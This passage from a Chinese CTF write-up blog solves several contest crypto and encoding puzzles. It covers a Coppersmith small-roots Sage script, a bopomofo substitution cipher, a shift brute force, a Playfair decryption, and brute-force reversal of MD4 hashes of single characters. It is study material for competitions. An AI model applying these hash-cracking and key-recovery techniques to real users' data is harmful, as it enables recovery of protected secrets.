<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(<span class="string">&quot;coppersmith.sage&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">pi = <span class="number">43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line">x_ = [<span class="number">3248642833056635029095920782095626337949113592116495266</span>, <span class="number">4883935221919623989344404485025479346028101682781790392</span>]</span><br><span class="line">c = <span class="number">193207529097125793778662519051231322609402866155819915933598367395102313904490702547833</span></span><br><span class="line"></span><br><span class="line">PR.&lt;t&gt; = PolynomialRing(Fp)</span><br><span class="line">f = t * t + pi</span><br><span class="line"></span><br><span class="line">PR.&lt;k0, k1&gt; = PolynomialRing(Fp)</span><br><span class="line">s = f(x_[<span class="number">0</span>]*<span class="number">2</span>^<span class="number">73</span> + k0)-x_[<span class="number">1</span>]*<span class="number">2</span>^<span class="number">73</span>-k1</span><br><span class="line">roots = small_roots(s, (<span class="number">2</span>^<span class="number">73</span>, <span class="number">2</span>^<span class="number">73</span>), m=<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">k0, k1 = roots</span><br><span class="line"></span><br><span class="line">v0 = <span class="number">2</span>^<span class="number">73</span> * x_[<span class="number">0</span>] + k0</span><br><span class="line">v1 = <span class="number">2</span>^<span class="number">73</span> * x_[<span class="number">1</span>] + k1</span><br><span class="line"></span><br><span class="line">y = f(v1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    y = f(y)</span><br><span class="line">    c ^^= <span class="built_in">int</span>(y)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>

<p>所以jo师傅博客上面的推导，其实我们已经做了大半，就差一个函数实现了</p>
<p><em>学到还挺多的。通过这道题，我认识到，以后在Crypto方向上，必须即时跟进新的题型，以及多逛逛github，并且足够幸运能够看懂一些原理，尽量都自己实现一下。现在确实tcl，之前实现的一个playfair，今天想跑的时候结果又错误满天飞</em></p>
<h2 id="海那边漂来的漂流瓶"><a href="#海那边漂来的漂流瓶" class="headerlink" title="海那边漂来的漂流瓶"></a>海那边漂来的漂流瓶</h2><p>春哥师傅的题目，当时我们组有师傅第二个做出来</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<p>在海的那边漂过来一个漂流瓶，停在了沙滩上。 你把它捡起来，却不知道漂流瓶里的纸上到底写了些啥。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZJ6 -3 AI6 G8 EL NJ4 EJ/ XJ4 1O3 FU3 RU RUP EJ/ XJ4 S06 54 284 Q/6 J0 ， 5J3 VU04 T;6 2J4 431 EJ/ XU3 。 Y4 1O3 D9 G3 S06 VU/6 ， U VM4 RU/ EJI4 RU XJ/6 G4 、 VUP 1O3 G4 、 W96 1O3 G4 、 WL6 M06 G4 、 VUP 5J6 VU04 、 VUP 5J6 G4 、 AUL6 XU4 VU04 、 W96 5J/ G4 、 5; CJ84 VU04 、 S06 W.6 VU04 、 MP6 XUP6 VU04 、 RU8 U4 VU04 、 RU8 U4 G4 、 W96 S06 G4 、 EL VM/6 G4 、 QU/6 2J/ VU04 。 ZJ6 X94 EK6 2U6 SO4 BJ/6 G4 T QJ6 WL6 1J4 WJ3 QJ6 WL6 QU6 1J4 T QJ6 WL6 2L3 WJ3 QJ6 WL6 QU6 2U6 C04 M3 QUP UP G.3 Y4 AJ3 QUP RU, 。 FU6 5J/ U.6 M6 XJ4 2J04 RU04 GK4 G6 2U6 M/4 2U4 FM3 2K6 JP4 WU6 ， Y94 W96 5J/ G4 M3 5; CJ84 VU04 5 RU0 M06 1P3 U/ E9 G4 S06 1O3 Y.3 VU;4 2U6 ZJ6 -3 AI6 G8 EL NJ4 EJ/ XJ4 CP3 XU4 J94 2U4 G4 T/6 VU04 2J/ VU VU;4 2U6 Y.3 VU;4 ， Y4 S06 1J4 1O3 G;4 VU0 RU/ 5; CJ84 VU04 ZP M06 VU; ， DJ84 J VU 54 W96 5J/ G4 J4 Z/ FM 、 J B4 FM 5 C.4 ， Y94 VU;4 VU VU/6 54 5; CJ84 VU04 1O3 1J4 2U6 5; CJ84 G4 ， U06 J VU （ NJ6 T/ 284 2J4 VU ） VU VU/6 54 5; CJ84 VU04 CK6 AO3 5P4 ， 5J03 EK4 RU, RUP4 56 RUL3 2U6 284 J0 ， DJ84 M,4 284 2J4 VU RUP4 BJ4 W96 5J/ G4 C93 VU04 2U4 FM 。 1U,6 J;4 RU4 183 ZJ6 X94 EK6 M/4 VU WU 94 ZJ3 VU.4 2U6 EK6 G4 1L EJI3 FU3 X96 I6 。 VU; 2JO4 M6 5J/ G0 EL 2; TJ EJO CJ86 G4 U3 TJ04 XU06 W96 J0 VU 04 5J3 UL4 284 T/6 G4 JO6 AJ4 2U6 ， DL3 XU;6 2L4 QU/6 C/6 2U4 FM Z8 503 、 WJ3 2U4 FM3 2K6 2U6 T/6 1P3 M3 1U4 AU03 2J G4 ZJ4 RUP4 2J03 WJ6 WJ/ FUP6 TK XU.6 YL4 T/6 YJ3 N9 ， ZJ6 -3 AI6 G8 EL NJ4 EJ/ XJ4 2U6 VM03 VU04 RU, DK4 U4 1U4 D9 1J4 ZP BP6 D.3 T.6 AU4 2U6 2J CJO4 FM 1U/4 RU/ EJI4 VM3 2JI M06 1P3 2U 2J4 D9 Z8 2U6 VU; HJP 2U4 294 。</span><br></pre></td></tr></table></figure>

<p>hint1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">广州火车站上霸气外露的标语：统一祖国 振兴中华</span><br></pre></td></tr></table></figure>

<p>hint2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靠北耶！E04！</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 解题思路</p>
</blockquote>
<p>显然是类似一种单表替换的东西，然后随便挑了几个去搜，就在 github 上找到<a href="https://github.com/chinese-opendesktop/cin-tables/blob/master/bopomofo.cin">https://github.com/chinese-opendesktop/cin-tables/blob/master/bopomofo.cin</a> 至于第一个 hint 我到现在都没有理解其意思，第二个 hint 是台湾方言和台湾网络用语，夸你很牛逼的意思</p>
<p>github 里是正体注音輸入法的对照词库吧，正好对应了 E04! 的由来，也很呼应题目</p>
<p>然后手撕吧，太菜了，不会用 python 处理数据</p>
<p>撕到一半</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">福尔摩沙高速公路北起基金公路南至大鹏湾，主线长<span class="number">431</span>公里，自北开始南行，依序经过基隆市、台北县、桃园县、新竹县、苗栗县、台中县、彰化县、南投县、云林县、嘉义县、台南县、高雄县与屏东县。fu lai ge的内容是吃葡萄不吐葡萄皮不吃葡萄不吐葡萄皮的汉语拼音首字母拼接。</span><br></pre></td></tr></table></figure>

<p>另一位师傅说后面还有一些信息，但有师傅说直接输入这句顺口溜的拼音首字母就过了</p>
<p>过了就过了吧</p>
<p>然后看官方 WP 春哥师傅说可以用在线的网站搞；切换下输入法就好，强啊</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711151337886.png" alt="image-20210711151337886"></p>
<p><em>另外这种题目，比赛的时候不要死扣，能做出来就好，为了完美主义全部整出来绝对是浪费时间。在比赛中这点很重要。你有功夫大可赛后再搞，比如我现在就懒得搞了doge</em></p>
<hr>
<h2 id="群主说要出简单的题目大家把这题想简单一点"><a href="#群主说要出简单的题目大家把这题想简单一点" class="headerlink" title="群主说要出简单的题目大家把这题想简单一点"></a>群主说要出简单的题目大家把这题想简单一点</h2><p>xsl</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">24873777989291448485268365702265085243886872900039809831478881276969311714448924581398692832639705916538111455861057354225427758736198452679468399039512440497290615485190994957684665065261280544484301856860844163436499302230085760545686486398949018187416289923500558688885485672960734334858119391323987554701544773420070317895909846297195832399677291338220818181502181317849952785959097285626009703863257450199781708945715701136683994546852422993684382468187651935055302074609980311161155531603473091857526099148935429447319415714778860215376802270686310782735079899235228731429165106477537031235405221734008734614847</span></span><br><span class="line">e = <span class="number">12436888994645724242634182851132542621943436450019904915739440638484655857224462290699346416319852958269055727930528677112713879368099226339734199519756220248645307742595497478842332532630640272242150928430422081718249651115042880272843243199474509093708144961750279344442742836480367167429059695661993777350613653317802356713323129593521588320771616955563426747034967432053960828426250168954828986666929922730060781213890566121107119389060806644531516491192343284701151238691996162679338542186167193568672632227858449997036747029810933106336313085633759799229646747282205612102678724267585967720538082620536177904609</span></span><br><span class="line">c = <span class="number">7539424334663709603622451394173266049480031393220309445902319310504736287365860451132752036622339554159799611768328686792828750952551268647863160547774237934958072391797341405165512721597085695555356929495861914056799039140107261439671707574841789330531198534325422015873621769489969596614802282764401661006564546159674397356683650318142728009273827997179696988926599672213482848150751054351595386402597000601684644207559735499031666361222038615475154046453649719203304187309556004660926226182353445661702352380654352874617084419834338343925880593023307238768452509962</span></span><br></pre></td></tr></table></figure>

<p>e 很大，尝试过 boneh_durfee，但是出不来；检查条件，这 e 也太大了吧</p>
<p>然后在诸多hint中看到</p>
<p>当你凝视密文的时候，密文也在凝视着你。</p>
<p>妙啊，尼采</p>
<p>当你凝视密文的时候，明文也在凝视着你。直接 c 转字节，当时手快拿下一血</p>
<h2 id="The-Dedication-of-Suspect-M"><a href="#The-Dedication-of-Suspect-M" class="headerlink" title="The Dedication of Suspect M"></a>The Dedication of Suspect M</h2><p>麻了，这场比赛最麻的一道题。8神师傅的题目，春哥师傅隔了7分钟就出了并且全场唯一解，直到比赛结束，我都丝毫没有头绪</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<p>题目信息很多，我直接给图了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711152717959.png" alt="image-20210711152717959"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>我整理出来的，有以下线索：</p>
<ul>
<li><p>是一个动态的环境，提供压缩包下载，里面有个名为 M 的二进制文件，文件内容每重开一次环境都不相同、大小从 2K 到 5K 不等；那么flag 基本上也是动态的了</p>
</li>
<li><p>flag 的内容是小写字母的十六进制，中间有短横分隔</p>
</li>
<li><p>嫌疑人X的献身改成了嫌疑人M的陷深</p>
</li>
</ul>
<p>？？？有内味了？？？燃起来了？？？</p>
<p>一开始的时候丝毫没有头绪</p>
<p>根据现有的线索：动态的每次 flag 都不相同、0-9 a-f，我所能想到的就是</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711154007056.png" alt="image-20210711154007056"></p>
<p>但我和组内的师傅试过，不管是给文件 md5，还是给压缩包 md5，都不太行；md4也不行；还有是这个分割线不知道怎么切割，我一并按照样例来处理的，也不知道对不对。TNL，要达不溜屁</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/VRD%7D_TUZ28Z%7BHXI95%7DR4SR4.jpg" alt="img"></p>
<p>第三天起床补的，发现春哥师傅发博客了，这就去添</p>
<p>春哥师傅的思路是将那些不可见的字符给转变成换行符<code>0D 0A</code>，也就是<code>\r \n</code>，<strong>windows用<code>\r\n</code>表示换行</strong></p>
<p>就是将这些不可见的小点通过在128个ascii字符表中位移带走</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210712094503819.png" alt="image-20210712094503819"></p>
<p>春哥师傅准确计算出了密钥，我第一次也可以，但怎么改那些小字母数字提交的flag都不对，之后我重新开了几次环境，就直接爆破了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../M&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    t = <span class="built_in">bytes</span>([(x - i) % <span class="number">128</span> <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">    <span class="built_in">print</span>(t.decode())</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;===================================&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>找到像样的，是figlet艺术字，手敲一遍</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210712093228438.png" alt="image-20210712093228438"></p>
<p>比赛结束，顺手带走几道水题，卡住了的记录一下</p>
<h1 id="36D杯"><a href="#36D杯" class="headerlink" title="36D杯"></a>36D杯</h1><h2 id="justShow"><a href="#justShow" class="headerlink" title="justShow"></a>justShow</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hlcgoyfsjqknyifnpd:bcdefghijklmnopqrstuvwxyza</span><br></pre></td></tr></table></figure>

<p>冒号后面的提示凯撒位移，移回来得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gkbfnxeripjmxhemoc:abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>

<p>然后没想到是playfair，后面是key；拿去在线网站解密一下</p>
<p>这里有点狗，因为playfair的字母表只有25个，一般是用i代替j；但这里不是，还没有明说，所以缺省情况是出不来的。因为key就是a-z，所以字母表就是a-z，不用代替任何字母了，随便改一下参数</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711101933363.png" alt="image-20210711101933363"></p>
<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flagctfshow&#123;ctfshowicome&#125;</span><br></pre></td></tr></table></figure>

<h2 id="飞鸽传书"><a href="#飞鸽传书" class="headerlink" title="飞鸽传书"></a>飞鸽传书</h2><p>提供附件下载，pub.key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TVdJd09HRm1NamMyWkdKak56VTVNekkzTVdZMFpXVTJNVFl5T0Rrek1qUWxNRUZsTW1GbE0yRXlNelV3TnpRell6VXhObU5rWVRReE1qUTVPV0poTTJKbE9TVXdRV0prWlRVeVkySXpNV1JsTXpObE5EWXlORFZsTURWbVltUmlaRFptWWpJMEpUQkJaVEl6WlRBd1ltVXpPV1F6Tm1Zek5EWXlaVFUzTm1FMk4yRTNaamt4T1RrbE1FRXhPR00zT1RJNE5XSTFNVFJqTmpObVl6a3dNelZsTTJZNU1qQmhaVFEzTnlVd1FXUmhORFJrWkRFNU1tUmxabVF4WW1VM09XWTJNMk16TlRCa01qa3lNR05tSlRCQk5ESTFNV00wWXpZME9XTTNaREptT0RZek1qZGxabVJsTWpNNU9USm1ZVGNsTUVGaFlXVTNZakprTkRneU16Z3lZV0ZoWkRjMVptUmxOalJrWmpobVpqZzJaaVV3UVRJNU5tWTNabVpqTW1VME5UUTFaR00zTnpreU1EVXdZMlZpTkdFNE56RXhKVEJCTmpFd04yRmpNV0UxTldZeFpUQm1aV05pTjJSa1lqWXdabUl6WW1ZeE1Ea2xNRUZoWldNeU16TXpNekl4WkRjek1EQXdNVFl4TmpneVpETmpOR1ZpWXpBd09TVXdRVFV3TURWaU0ySm1NREF3TlRCaVpqUm1OMlUwTTJGak16TmhNRFExTkdJNEpUQkI=</span><br></pre></td></tr></table></figure>

<p>不是很正规的PEM格式的公钥文件，尝试手撕，两次Base64，一次URL，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1b08af276dbc7593271f4ee616289324</span><br><span class="line">e2ae3a2350743c516cda412499ba3be9</span><br><span class="line">bde52cb31de33e46245e05fbdbd6fb24</span><br><span class="line">e23e00be39d36f3462e576a67a7f9199</span><br><span class="line">18c79285b514c63fc9035e3f920ae477</span><br><span class="line">da44dd192defd1be79f63c350d2920cf</span><br><span class="line">4251c4c649c7d2f86327efde23992fa7</span><br><span class="line">aae7b2d482382aaad75fde64df8ff86f</span><br><span class="line">296f7ffc2e4545dc7792050ceb4a8711</span><br><span class="line">6107ac1a55f1e0fecb7ddb60fb3bf109</span><br><span class="line">aec2333321d73000161682d3c4ebc009</span><br><span class="line">5005b3bf00050bf4f7e43ac33a0454b8</span><br></pre></td></tr></table></figure>

<p>看着有点像MTP，跑一下美团用过的脚本，出来这样一个玩意，没有任何实际意思可言，麻了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211116183626206.png" alt="image-20211116183626206"></p>
<p>然后看了wp是hash函数类型的，然后找逆hash的网站，有些网站要登录收费了；解成功的几个发现是md4，且结果有数字和字母，于是自己写个爆破一下</p>
<p>记得hashlib库里好像没有md4，就从github上随便找了一段源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_pad</span>(<span class="params">msg</span>):</span></span><br><span class="line">    n = <span class="built_in">len</span>(msg)</span><br><span class="line">    bit_len = n * <span class="number">8</span></span><br><span class="line">    index = n &amp; <span class="number">0x3f</span></span><br><span class="line">    pad_len = <span class="number">120</span> - index</span><br><span class="line">    <span class="keyword">if</span> index &lt; <span class="number">56</span>:</span><br><span class="line">        pad_len = <span class="number">56</span> - index</span><br><span class="line">    padding = <span class="string">b&#x27;\x80&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">63</span></span><br><span class="line">    suffix = bit_len.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    padded_msg = msg + padding[:pad_len] + suffix</span><br><span class="line">    <span class="keyword">return</span> padded_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_left_rotate</span>(<span class="params">n, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((n &lt;&lt; b) | ((n &amp; <span class="number">0xffffffff</span>) &gt;&gt; (<span class="number">32</span> - b))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_if</span>(<span class="params">x, y, z</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; y | ~x &amp; z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_maj</span>(<span class="params">x, y, z</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; y | x &amp; z | y &amp; z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_xor3</span>(<span class="params">x, y, z</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x ^ y ^ z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_f1</span>(<span class="params">a, b, c, d, k, s, X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> _left_rotate(a + _<span class="keyword">if</span>(b, c, d) + X[k], s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_f2</span>(<span class="params">a, b, c, d, k, s, X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> _left_rotate(a + _maj(b, c, d) + X[k] + <span class="number">0x5a827999</span>, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_f3</span>(<span class="params">a, b, c, d, k, s, X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> _left_rotate(a + _xor3(b, c, d) + X[k] + <span class="number">0x6ed9eba1</span>, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MD4</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.A = <span class="number">0x67452301</span></span><br><span class="line">        self.B = <span class="number">0xefcdab89</span></span><br><span class="line">        self.C = <span class="number">0x98badcfe</span></span><br><span class="line">        self.D = <span class="number">0x10325476</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self, message_string</span>):</span></span><br><span class="line">        msg_bytes = _pad(message_string)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_bytes), <span class="number">64</span>):</span><br><span class="line">            self._compress(msg_bytes[i:i + <span class="number">64</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_compress</span>(<span class="params">self, block</span>):</span></span><br><span class="line">        a, b, c, d = self.A, self.B, self.C, self.D</span><br><span class="line"></span><br><span class="line">        x = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">64</span>, <span class="number">4</span>):</span><br><span class="line">            x.append(<span class="built_in">int</span>.from_bytes(block[i:i + <span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">        a = _f1(a, b, c, d, <span class="number">0</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f1(d, a, b, c, <span class="number">1</span>, <span class="number">7</span>, x)</span><br><span class="line">        c = _f1(c, d, a, b, <span class="number">2</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f1(b, c, d, a, <span class="number">3</span>, <span class="number">19</span>, x)</span><br><span class="line">        a = _f1(a, b, c, d, <span class="number">4</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f1(d, a, b, c, <span class="number">5</span>, <span class="number">7</span>, x)</span><br><span class="line">        c = _f1(c, d, a, b, <span class="number">6</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f1(b, c, d, a, <span class="number">7</span>, <span class="number">19</span>, x)</span><br><span class="line">        a = _f1(a, b, c, d, <span class="number">8</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f1(d, a, b, c, <span class="number">9</span>, <span class="number">7</span>, x)</span><br><span class="line">        c = _f1(c, d, a, b, <span class="number">10</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f1(b, c, d, a, <span class="number">11</span>, <span class="number">19</span>, x)</span><br><span class="line">        a = _f1(a, b, c, d, <span class="number">12</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f1(d, a, b, c, <span class="number">13</span>, <span class="number">7</span>, x)</span><br><span class="line">        c = _f1(c, d, a, b, <span class="number">14</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f1(b, c, d, a, <span class="number">15</span>, <span class="number">19</span>, x)</span><br><span class="line"></span><br><span class="line">        a = _f2(a, b, c, d, <span class="number">0</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f2(d, a, b, c, <span class="number">4</span>, <span class="number">5</span>, x)</span><br><span class="line">        c = _f2(c, d, a, b, <span class="number">8</span>, <span class="number">9</span>, x)</span><br><span class="line">        b = _f2(b, c, d, a, <span class="number">12</span>, <span class="number">13</span>, x)</span><br><span class="line">        a = _f2(a, b, c, d, <span class="number">1</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f2(d, a, b, c, <span class="number">5</span>, <span class="number">5</span>, x)</span><br><span class="line">        c = _f2(c, d, a, b, <span class="number">9</span>, <span class="number">9</span>, x)</span><br><span class="line">        b = _f2(b, c, d, a, <span class="number">13</span>, <span class="number">13</span>, x)</span><br><span class="line">        a = _f2(a, b, c, d, <span class="number">2</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f2(d, a, b, c, <span class="number">6</span>, <span class="number">5</span>, x)</span><br><span class="line">        c = _f2(c, d, a, b, <span class="number">10</span>, <span class="number">9</span>, x)</span><br><span class="line">        b = _f2(b, c, d, a, <span class="number">14</span>, <span class="number">13</span>, x)</span><br><span class="line">        a = _f2(a, b, c, d, <span class="number">3</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f2(d, a, b, c, <span class="number">7</span>, <span class="number">5</span>, x)</span><br><span class="line">        c = _f2(c, d, a, b, <span class="number">11</span>, <span class="number">9</span>, x)</span><br><span class="line">        b = _f2(b, c, d, a, <span class="number">15</span>, <span class="number">13</span>, x)</span><br><span class="line"></span><br><span class="line">        a = _f3(a, b, c, d, <span class="number">0</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f3(d, a, b, c, <span class="number">8</span>, <span class="number">9</span>, x)</span><br><span class="line">        c = _f3(c, d, a, b, <span class="number">4</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f3(b, c, d, a, <span class="number">12</span>, <span class="number">15</span>, x)</span><br><span class="line">        a = _f3(a, b, c, d, <span class="number">2</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f3(d, a, b, c, <span class="number">10</span>, <span class="number">9</span>, x)</span><br><span class="line">        c = _f3(c, d, a, b, <span class="number">6</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f3(b, c, d, a, <span class="number">14</span>, <span class="number">15</span>, x)</span><br><span class="line">        a = _f3(a, b, c, d, <span class="number">1</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f3(d, a, b, c, <span class="number">9</span>, <span class="number">9</span>, x)</span><br><span class="line">        c = _f3(c, d, a, b, <span class="number">5</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f3(b, c, d, a, <span class="number">13</span>, <span class="number">15</span>, x)</span><br><span class="line">        a = _f3(a, b, c, d, <span class="number">3</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f3(d, a, b, c, <span class="number">11</span>, <span class="number">9</span>, x)</span><br><span class="line">        c = _f3(c, d, a, b, <span class="number">7</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f3(b, c, d, a, <span class="number">15</span>, <span class="number">15</span>, x)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># update state</span></span><br><span class="line">        self.A = (self.A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        self.B = (self.B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        self.C = (self.C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        self.D = (self.D + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">digest</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> binascii.hexlify(</span><br><span class="line">            self.A.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) + \</span><br><span class="line">            self.B.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) + \</span><br><span class="line">            self.C.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) + \</span><br><span class="line">            self.D.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">        ).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> MD4</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;&#x27;&#x27;1b08af276dbc7593271f4ee616289324</span></span><br><span class="line"><span class="string">e2ae3a2350743c516cda412499ba3be9</span></span><br><span class="line"><span class="string">bde52cb31de33e46245e05fbdbd6fb24</span></span><br><span class="line"><span class="string">e23e00be39d36f3462e576a67a7f9199</span></span><br><span class="line"><span class="string">18c79285b514c63fc9035e3f920ae477</span></span><br><span class="line"><span class="string">da44dd192defd1be79f63c350d2920cf</span></span><br><span class="line"><span class="string">4251c4c649c7d2f86327efde23992fa7</span></span><br><span class="line"><span class="string">aae7b2d482382aaad75fde64df8ff86f</span></span><br><span class="line"><span class="string">296f7ffc2e4545dc7792050ceb4a8711</span></span><br><span class="line"><span class="string">6107ac1a55f1e0fecb7ddb60fb3bf109</span></span><br><span class="line"><span class="string">aec2333321d73000161682d3c4ebc009</span></span><br><span class="line"><span class="string">5005b3bf00050bf4f7e43ac33a0454b8&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    m = MD4()</span><br><span class="line">    m.update(i.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    t = m.digest()</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> cipher:</span><br><span class="line">        cipher = cipher.replace(t, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher.split():</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;36D_me&#125;</span><br></pre></td></tr></table></figure>

<p>以后md4不愁了，此外md4也是32位的</p>
<h1 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h1><h2 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文：2559659965656A9A65656996696965A6695669A9695A699569666A5A6A6569666A59695A69AA696569666AA6</span><br></pre></td></tr></table></figure>

<p>hint</p>
